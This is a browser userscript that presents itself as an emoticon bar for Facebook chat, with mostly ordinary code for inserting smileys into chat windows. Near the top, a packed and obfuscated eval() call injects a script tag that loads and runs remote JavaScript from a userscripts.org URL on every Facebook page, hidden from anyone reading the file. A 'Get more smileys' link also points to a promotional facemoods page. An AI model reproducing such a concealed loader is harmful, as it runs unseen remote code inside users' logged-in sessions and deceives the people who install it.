// ==UserScript==
// @name           Facebook ChatBar + Plus + Last Update
// @include        http://www.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        http://apps.facebook.com/*
// @version        1.4.1
// @author         Mike Shamory
// @author         archih
// @author	   bitMAN
// ==/UserScript==
//

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// List of emoticons
// :) :( :D >:( -_- :/ o.O :p :'( >:O :v 3:) :o :3 ;) :* :|] 8) <3 :putnam: 8| ^_^ (^^^) O:)
	
	var emotsInfo = new Array();
	emotsInfo[0] = ':)';		emotsInfo[1] = 590;
	emotsInfo[2] = ':(';		emotsInfo[3] = 606;
	emotsInfo[4] = ':p';		emotsInfo[5] = 622;
	emotsInfo[6] = ':D';		emotsInfo[7] = 638;
	emotsInfo[8] = '>:(';		emotsInfo[9] = 718;
	emotsInfo[10] = '-_-';		emotsInfo[11] = 846;
	emotsInfo[12] = ':/';		emotsInfo[13] = 734;
	emotsInfo[14] = 'o.O';		emotsInfo[15] = 862;
	emotsInfo[16] = ":'(";		emotsInfo[17] = 750;
	emotsInfo[18] = '>:O';		emotsInfo[19] = 878;
	emotsInfo[20] = ':v';		emotsInfo[21] = 894;
	emotsInfo[22] = '3:)';		emotsInfo[23] = 766;
	emotsInfo[24] = ':o';		emotsInfo[25] = 654;
	emotsInfo[26] = ':3';		emotsInfo[27] = 910;
	emotsInfo[28] = ';)';		emotsInfo[29] = 670;
	emotsInfo[30] = ':*';		emotsInfo[31] = 798;
	emotsInfo[32] = '8)';		emotsInfo[33] = 686;
	emotsInfo[34] = '<3';		emotsInfo[35] = 814;
	emotsInfo[36] = '8|';		emotsInfo[37] = 702;
	emotsInfo[38] = '^_^';		emotsInfo[39] = 830;
	emotsInfo[40] = 'O:)';		emotsInfo[41] = 782;
	emotsInfo[42] = ':|]';		emotsInfo[43] = 924;
	emotsInfo[44] = '(^^^)';	emotsInfo[45] = 940;
	emotsInfo[46] = ':putnam:';	emotsInfo[47] = 572;
	emotsInfo[48] = '<(")';		emotsInfo[49] = 518;
	emotsInfo[50] = '_msg_';	emotsInfo[51] = 536;
	emotsInfo[52] = '*msg*';	emotsInfo[53] = 554;
	emotsInfo[54] = 'popout';	emotsInfo[55] = 500;

	var fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');
	fEmotBarDom.setAttribute('style','line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-bottom-style: solid; border-bottom-width: 1px; border-color: #EEEEEE;');
	
	for(i=0;i<emotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',emotsInfo[i]);
		fEmotsDom.setAttribute('style','cursor: pointer; background: transparent url(http://facebookchatbar.ucoz.com/images/themes/tmp_1.png) no-repeat scroll -'+ emotsInfo[i+1] +'px -84px; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;');
		fEmotsDom.setAttribute('src','http://static.ak.fbcdn.net/images/blank.gif');
		fEmotsDom.setAttribute('class','_FBCT_EXT_emote_img emote_img');
		fEmotBarDom.appendChild(fEmotsDom);
	}
	if (!__FM__HAS__){
		var fEmotsDomlink = document.createElement('div');
		fEmotsDomlink.setAttribute('alt','get more');
		fEmotsDomlink.setAttribute('title','Get more smileys and animation for your facebook chat');
		fEmotsDomlink.setAttribute('target','_blank');
		fEmotsDomlink.setAttribute('style','cursor: pointer;cursor:hand;width:100%;text-align:center;margin:0px auto;height:15px;color:#3B5998;');
		fEmotsDomlink.innerHTML = 'Get more smileys! click here';
		fEmotsDomlink.setAttribute('class','_FBCT_EXT_emote_get');
		fEmotBarDom.appendChild(fEmotsDomlink);
	}
	
	document.addEventListener("DOMNodeInserted", fInsertedNodeHandler, false);

	var debugMode = false;

	function showAlert(str){
		if (debugMode) alert(str);
	}

	function fInsertedNodeHandler(event) {
		try{
			elm = jQuery(event.target);
		//if(event.target.getElementsByClassName && event.target.getElementsByClassName('chat_window')[0])
		if(elm.hasClass('fbChatTab')&&
			!jQuery('.chat_tab_emot_bar',elm).length)	
			fInsertEmotBar(event.target);
		}catch(e){showAlert('fInsertedNodeHandler: ' + e.message)}
	}

	function fInsertEmotBar(fChatWrapper) {
		try{
			//showAlert(fChatWrapper.className);
			//fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyout')[0].getElementsByClassName('fbNubFlyoutBody')[0];
			fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyout')[0].getElementsByClassName('fbNubFlyoutBody')[0];
			fNewEmotBar = fEmotBarDom.cloneNode(true);
			//for(i=0;i<fNewEmotBar.childNodes.length;i++) fNewEmotBar.childNodes[i].addEventListener('click', fEmotClickHandler , false);
			//var yosi = fChatWrapper.getElementsByClassName('fbNubFlyout')[0];
			//yosi.addEventListener('click', fEmotClickHandler , true);
			if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.firstChild);
			else fChatToolBox.appendChild(fNewEmotBar);
			$('img',fNewEmotBar).bind('click',fEmotClickHandler);
			$('._FBCT_EXT_emote_get',fNewEmotBar).bind('click',fEmotClickHandler);
			//showAlert($('._FBCT_EXT_emote_get',fNewEmotBar).length);
		}catch(e){showAlert('fInsertEmotBar: ' + e.message)}
	}

	function fEmotClickHandler(event){
		try{
			elm = jQuery(event.target);
			//showAlert('elm: ');
			var fChatInput = event.target.parentNode.parentNode.parentNode.getElementsByClassName('chat_input_div')[0].getElementsByClassName('chat_input')[0];
	        if (event.target.getAttribute('alt') == 'popout') {
	                window.open('http://www.facebook.com/presence/popout.php');
			}else {
				if (event.target.getAttribute('alt') == 'get more') {
	                window.open('http://facemoods.com/landing/chattab');
				} else {
					if (elm.hasClass('_FBCT_EXT_emote_img')){
						fChatInput.value += ' ' + event.target.getAttribute('alt')+' ';
						fChatInput.focus();
					}
	             }
			}
		}catch(e){showAlert('fEmotClickHandler: ' + e.message)}
	}
	
	
